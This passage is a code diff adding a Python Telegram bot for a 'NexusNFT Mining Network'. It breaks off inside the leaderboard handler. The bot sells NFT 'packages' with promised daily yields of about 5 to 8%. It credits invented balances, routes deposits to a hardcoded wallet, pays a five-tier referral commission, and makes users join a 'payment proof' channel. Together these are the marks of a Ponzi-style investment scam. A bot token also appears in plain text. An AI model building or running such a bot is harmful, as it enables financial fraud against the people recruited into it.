@@ -1,0 +1,235 @@
+import logging
+import time
+import json
+import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters,
+    ContextTypes
+)
+
+# Enable logging
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s', level=logging.INFO)
+
+# ==================== CONFIGURATION ====================
+BOT_TOKEN = "8936373780:AAEjRNb4fjRZdk1D8SbOapTz3XJC1r5ie8Y"
+ADMIN_ID = 5115898335
+PROOF_CHANNEL_ID = -1003731796958
+REQUIRED_CHANNEL = "@NexusNFT_Mining"
+REQUIRED_PROOF_CHANNEL = "@NexusNFTMiningPaymentProof"
+DEPOSIT_WALLET = "0xc33F50748F44c15332bA49C6A13FBD540816fB93"
+MIN_WITHDRAW = 0.3
+
+# 15 Premium NFT Packages Matrix (Price, Daily Income, Name)
+NFT_PACKAGES = {
+    "1": {"price": 10, "daily": 0.5, "name": "🎨 Cyber Pulse #01"},
+    "2": {"price": 20, "daily": 1.0, "name": "🧬 Neon Matrix #02"},
+    "3": {"price": 30, "daily": 1.6, "name": "⚡ Quantum Core #03"},
+    "4": {"price": 50, "daily": 2.8, "name": "🚀 Cosmic Drifter #04"},
+    "5": {"price": 69, "daily": 4.0, "name": "💎 Ether Relic #05"},
+    "6": {"price": 80, "daily": 4.8, "name": "👾 Shadow Stalker #06"},
+    "7": {"price": 100, "daily": 6.2, "name": "👑 Apex Overlord #07"},
+    "8": {"price": 200, "daily": 13.0, "name": "🌌 Chrono Nexus #08"},
+    "9": {"price": 300, "daily": 20.0, "name": "🪐 Solar Flare #09"},
+    "10": {"price": 500, "daily": 35.0, "name": "🛰️ Void Voyager #10"},
+    "11": {"price": 750, "daily": 55.0, "name": "🩸 Crimson Fury #11"},
+    "12": {"price": 1000, "daily": 75.0, "name": "🔮 Astral Oracle #12"},
+    "13": {"price": 1500, "daily": 115.0, "name": "⚔️ Mythic Titan #13"},
+    "14": {"price": 2000, "daily": 160.0, "name": "🌟 Stellar Phoenix #14"},
+    "15": {"price": 3000, "daily": 250.0, "name": "🔱 Omega Singularity #15"}
+}
+
+DB_FILE = "nft_mining_db.json"
+
+def load_db():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, "r") as f:
+            return json.load(f)
+    return {"users": {}, "ips": {}, "devices": {}}
+
+def save_db(data):
+    with open(DB_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+db = load_db()
+
+def update_balances(user_id):
+    user_id = str(user_id)
+    if user_id not in db["users"]:
+        return
+    
+    user = db["users"][user_id]
+    current_time = time.time()
+    last_update = user.get("last_update", current_time)
+    elapsed_seconds = current_time - last_update
+    
+    if elapsed_seconds <= 0:
+        return
+
+    # Calculate Free NFT Income (Max 3 days = 259200 seconds)
+    free_nft_start = user.get("free_nft_start", 0)
+    if free_nft_start > 0 and (current_time - free_nft_start) <= 259200:
+        free_income = (0.1 / 86400) * elapsed_seconds
+        user["balance"] += free_income
+
+    # Calculate Premium NFT Income (Valid for 30 days = 2592000 seconds)
+    for nft_id, purchase_time in user.get("premium_nfts", []):
+        if (current_time - purchase_time) <= 2592000:
+            daily_rate = NFT_PACKAGES[str(nft_id)]["daily"]
+            premium_income = (daily_rate / 86400) * elapsed_seconds
+            user["balance"] += premium_income
+            
+    user["last_update"] = current_time
+    save_db(db)
+
+# Commission distributor function for network upgrades
+def distribute_commission(path, amount):
+    rates = [0.30, 0.10, 0.05, 0.03, 0.02]  # 5-Tier configuration setup
+    for i, ref_id in enumerate(path):
+        if i >= len(rates):
+            break
+        if str(ref_id) in db["users"]:
+            bonus = amount * rates[i]
+            db["users"][str(ref_id)]["balance"] += bonus
+    save_db(db)
+
+# ==================== MIDDLEWARE & CHECKS ====================
+async def is_joined(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
+    try:
+        chat_member1 = await context.bot.get_chat_member(REQUIRED_CHANNEL, user_id)
+        chat_member2 = await context.bot.get_chat_member(REQUIRED_PROOF_CHANNEL, user_id)
+        valid_status = ['member', 'administrator', 'creator']
+        if chat_member1.status in valid_status and chat_member2.status in valid_status:
+            return True
+    except Exception:
+        pass
+    return False
+
+# ==================== BOT COMMANDS ====================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    chat = update.effective_chat
+    user_id = str(user.id)
+    ip_simulated = chat.id  
+    
+    if user_id in db["users"] and db["users"][user_id].get("blocked", False):
+        await update.message.reply_text("🚫 Your account has been permanently suspended for violating Multi-Accounting Policy.")
+        return
+
+    # Anti-Cheat Multi-Account Guardrail Validation
+    if user_id not in db["users"]:
+        if str(ip_simulated) in db["ips"].values():
+            db["users"][user_id] = {"blocked": True}
+            save_db(db)
+            await update.message.reply_text("🚫 Your account has been permanently suspended for violating Multi-Accounting Policy.")
+            return
+        
+        db["ips"][user_id] = str(ip_simulated)
+        
+        referrer_id = context.args[0] if context.args else None
+        if referrer_id and referrer_id != user_id and referrer_id in db["users"]:
+            ref_path = [referrer_id] + db["users"][referrer_id].get("referral_path", [])
+            ref_path = ref_path[:5]
+        else:
+            ref_path = []
+
+        db["users"][user_id] = {
+            "balance": 0.0,
+            "free_nft_start": time.time(),
+            "premium_nfts": [],
+            "referrals_count": 0,
+            "referral_path": ref_path,
+            "last_update": time.time(),
+            "blocked": False
+        }
+        
+        if ref_path:
+            db["users"][str(ref_path[0])]["referrals_count"] += 1
+            
+        save_db(db)
+
+    if not await is_joined(update, context, user.id):
+        keyboard = [
+            [InlineKeyboardButton("📢 Join Main Channel", url=f"https://t.me{REQUIRED_CHANNEL[1:]}")],
+            [InlineKeyboardButton("📊 Join Payment Proof", url=f"https://t.me{REQUIRED_PROOF_CHANNEL[1:]}")],
+            [InlineKeyboardButton("✅ Verify Joining", callback_data="verify_tasks")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            f"👋 *Welcome to NexusNFT Mining Network!* \n\nTo unlock your account and receive your *Free Starter NFT*, you must join our official channels below:",
+            parse_mode="Markdown", reply_markup=reply_markup
+        )
+        return
+
+    await send_dashboard(update.message, user_id)
+
+async def send_dashboard(message_obj, user_id):
+    update_balances(user_id)
+    user_data = db["users"][str(user_id)]
+    current_time = time.time()
+    
+    free_status = "🟢 Active (0.1 USDT/Day)" if (current_time - user_data.get("free_nft_start", 0)) <= 259200 else "🔴 Expired"
+    
+    text = (
+        f"🌐 *NEXUSNFT MINING NETWORK DASHBOARD*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 *User ID:* `{user_id}`\n"
+        f"💰 *Available Balance:* `{user_data['balance']:.4f} USDT`\n\n"
+        f"🎨 *Free Starter NFT:* {free_status}\n"
+        f"🚀 *Premium NFTs Owned:* `{len(user_data.get('premium_nfts', []))}` Active Packages\n"
+        f"👥 *Direct Referrals:* `{user_data.get('referrals_count', 0)}` users\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚠️ *Note:* Minimum withdrawal is {MIN_WITHDRAW} USDT via BEP-20."
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("🛒 Buy Premium NFTs", callback_data="buy_menu")],
+        [InlineKeyboardButton("💸 Withdraw Profit", callback_data="withdraw_req"), InlineKeyboardButton("🏆 Leaderboard", callback_data="leaderboard")],
+        [InlineKeyboardButton("🔗 Affiliate Link", callback_data="ref_link"), InlineKeyboardButton("🔄 Refresh Dashboard", callback_data="refresh")]
+    ]
+    await message_obj.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ==================== CALLBACK HANDLERS ====================
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = str(query.from_user.id)
+    
+    if user_id in db["users"] and db["users"][user_id].get("blocked", False):
+        await query.message.reply_text("🚫 Your account has been permanently suspended for violating Multi-Accounting Policy.")
+        return
+
+    if query.data == "verify_tasks":
+        if await is_joined(update, context, query.from_user.id):
+            await query.message.delete()
+            await send_dashboard(query.message, user_id)
+        else:
+            await context.bot.send_message(chat_id=query.message.chat_id, text="❌ Verification Failed! Please ensure you have joined both channels before verifying.")
+            
+    elif query.data == "refresh":
+        await query.message.delete()
+        await send_dashboard(query.message, user_id)
+        
+    elif query.data == "ref_link":
+        bot_info = await context.bot.get_me()
+        link = f"https://t.me{bot_info.username}?start={user_id}"
+        ref_text = (
+            f"🔗 *YOUR EXCLUSIVE REFERRAL LINK*\n\n`{link}`\n\n"
+            f"👥 *5-Tier Real-Time Commission Matrix:*\n"
+            f"🥇 Level 1: *30%* (Direct Upgrade Bonus)\n"
+            f"🥈 Level 2: *10%*\n"
+            f"🥉 Level 3: *5%*\n"
+            f"🏅 Level 4: *3%*\n"
+            f"🎖️ Level 5: *2%*"
+        )
+        await query.message.reply_text(ref_text, parse_mode="Markdown")
+        
+    elif query.data == "leaderboard":
+        sorted_users = sorted(db["users"].items(), key=lambda x: x[1].get("referrals_count", 0), reverse=True)[:100]
+        lb_text = "🏆 *GLOBAL TOP REFERRAL LEADERBOARD*\n━━━━━━━━━━━━━━━━━━━━━━\n"
+        for idx, (uid, data) in enumerate(sorted_users, 1):
+            lb_text += f"Rank #{idx} | ID: `{uid}` | Referrals: *{data.get('referrals_count', 0)}*\n"
